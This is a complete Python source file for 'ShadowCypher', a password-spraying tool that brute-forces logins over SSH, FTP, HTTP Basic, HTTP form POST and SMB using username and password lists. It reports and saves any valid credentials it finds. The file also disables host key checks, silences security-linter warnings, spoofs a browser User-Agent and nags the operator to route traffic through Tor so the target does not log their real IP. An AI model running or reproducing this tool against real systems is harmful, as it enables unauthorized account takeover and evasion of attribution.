#!/usr/bin/env python3
"""
SHADOWCYPHER // CREDENTIAL SPRAYER — Multi-Protocol Password Sprayer
Tests credentials across SSH, HTTP Basic, HTTP Form POST, FTP, and SMB.
Supports username/password lists, rate limiting, and result logging.

Usage:
    python3 auth_tester.py -t TARGET -s SERVICE [-u USER] [-U USERLIST] [-P PASSLIST]

Examples:
    python3 auth_tester.py -t 192.168.1.1 -s ssh -U users.txt -P passwords.txt
    python3 auth_tester.py -t http://target.com/login -s http-post -u admin -P rockyou.txt --data "user=^USER^&pass=^PASS^" --fail "Invalid"
"""

import argparse
import sys
import time
import socket
import ftplib  # nosec B402
import threading
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue

C = {"R":"\033[1;31m","G":"\033[1;32m","Y":"\033[1;33m","C":"\033[1;36m","N":"\033[0m","B":"\033[1m"}

def try_ssh(host, port, user, password, timeout=5):
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # nosec B507
        client.connect(host, port=port, username=user, password=password,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except ImportError:
        # Fallback to subprocess
        import subprocess
        result = subprocess.run(
            ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=5", f"{user}@{host}", "-p", str(port), "echo ok"],
            capture_output=True, text=True, timeout=timeout+2
        )
        return result.returncode == 0
    except Exception:
        return False

def try_ftp(host, port, user, password, timeout=5):
    try:
        ftp = ftplib.FTP()  # nosec B321
        ftp.connect(host, port, timeout=timeout)
        ftp.login(user, password)
        ftp.quit()
        return True
    except Exception:
        return False

def try_http_basic(url, user, password, timeout=5):
    import urllib.request
    import base64
    try:
        req = urllib.request.Request(url)
        cred = base64.b64encode(f"{user}:{password}".encode()).decode()
        req.add_header("Authorization", f"Basic {cred}")
        req.add_header("User-Agent", "Mozilla/5.0")
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # nosec B310
            return resp.getcode() != 401
    except Exception as e:
        if "401" in str(e):
            return False
        if "403" in str(e):
            return False
        return False

def try_http_post(url, user, password, data_template, fail_string, timeout=5):
    import urllib.request
    import urllib.parse
    try:
        data = data_template.replace("^USER^", user).replace("^PASS^", password)
        req = urllib.request.Request(url, data=data.encode(), method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", "Mozilla/5.0")
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # nosec B310
            body = resp.read().decode("utf-8", errors="replace")
            if fail_string and fail_string in body:
                return False
            return True
    except Exception:
        return False

def try_smb(host, user, password, domain=""):
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(host, host, sess_port=445, timeout=5)
        conn.login(user, password, domain)
        conn.logoff()
        return True
    except Exception:
        return False

def load_file(path):
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"  {C['R']}[-]{C['N']} File not found: {path}")
        sys.exit(1)

def main():
    p = argparse.ArgumentParser(description="ShadowCypher Authentication Tester")
    p.add_argument("-t","--target", required=True, help="Target (IP or URL)")
    p.add_argument("-s","--service", required=True, choices=["ssh","ftp","http-basic","http-post","smb"])
    p.add_argument("-u","--user", help="Single username")
    p.add_argument("-U","--userlist", help="Username list file")
    p.add_argument("-p","--password", help="Single password")
    p.add_argument("-P","--passlist", help="Password list file")
    p.add_argument("--port", type=int, default=0, help="Port (auto-detected if 0)")
    p.add_argument("--threads", type=int, default=5, help="Concurrent threads (default: 5)")
    p.add_argument("--delay", type=float, default=0.5, help="Delay between attempts (seconds)")
    p.add_argument("--data", default="user=^USER^&pass=^PASS^", help="POST data template for http-post")
    p.add_argument("--fail", default="", help="Failure indicator string for http-post")
    p.add_argument("--domain", default="", help="Domain for SMB")
    p.add_argument("-o","--output", help="Save found creds to file")
    a = p.parse_args()

    # Build credential pairs
    users = [a.user] if a.user else (load_file(a.userlist) if a.userlist else ["admin"])
    passwords = [a.password] if a.password else (load_file(a.passlist) if a.passlist else ["password","admin","123456"])

    # Auto-detect port
    default_ports = {"ssh":22,"ftp":21,"http-basic":80,"http-post":80,"smb":445}
    port = a.port if a.port else default_ports.get(a.service, 0)

    # OPSEC gate — warn if running without stealth
    try:
        from shadowcypher.core.stealth import stealth
        if not stealth.active:
            print(f"  {C['R']}[!] STEALTH WARNING: Tor not active — your real IP will be logged by the target.{C['N']}")
            print(f"  {C['Y']}    Start Ghost Mode or run: python3 scripts/tor_cloak.py start{C['N']}\n")
    except Exception:
        pass

    print(f"\n{C['B']}{'='*70}{C['N']}")
    print(f" {C['C']}SHADOWCYPHER // AUTHENTICATION TESTER{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}")
    print(f"  Target:  {C['Y']}{a.target}{C['N']}:{port}")
    print(f"  Service: {C['Y']}{a.service}{C['N']}")
    print(f"  Users:   {len(users)}  |  Passwords: {len(passwords)}")
    print(f"  Total:   {len(users) * len(passwords)} combinations")
    print(f"{C['B']}{'='*70}{C['N']}\n")

    found = []
    attempted = 0
    total = len(users) * len(passwords)

    # Build attempt function based on service
    def attempt(user, pwd):
        if a.service == "ssh":
            return try_ssh(a.target, port, user, pwd)
        elif a.service == "ftp":
            return try_ftp(a.target, port, user, pwd)
        elif a.service == "http-basic":
            return try_http_basic(a.target, user, pwd)
        elif a.service == "http-post":
            return try_http_post(a.target, user, pwd, a.data, a.fail)
        elif a.service == "smb":
            return try_smb(a.target, user, pwd, a.domain)

    try:
        for user in users:
            for pwd in passwords:
                attempted += 1
                sys.stdout.write(f"\r  [{attempted}/{total}] Trying {user}:{pwd[:20]}{'...' if len(pwd)>20 else ''}       ")
                sys.stdout.flush()

                if attempt(user, pwd):
                    print(f"\n  {C['G']}[+] VALID CREDENTIALS: {user}:{pwd}{C['N']}")
                    found.append((user, pwd))
                time.sleep(a.delay)
    except KeyboardInterrupt:
        print(f"\n\n  {C['Y']}[*]{C['N']} Interrupted.")

    print(f"\n\n{C['B']}{'='*70}{C['N']}")
    if found:
        print(f"  {C['G']}FOUND {len(found)} valid credential(s):{C['N']}")
        for u, pw in found:
            print(f"    {C['G']}●{C['N']} {u}:{pw}")
    else:
        print(f"  {C['R']}No valid credentials found.{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}\n")

    if a.output and found:
        with open(a.output, "w") as f:
            for u, pw in found:
                f.write(f"{u}:{pw}\n")
        print(f"  Saved to: {a.output}\n")

if __name__ == "__main__":
    main()
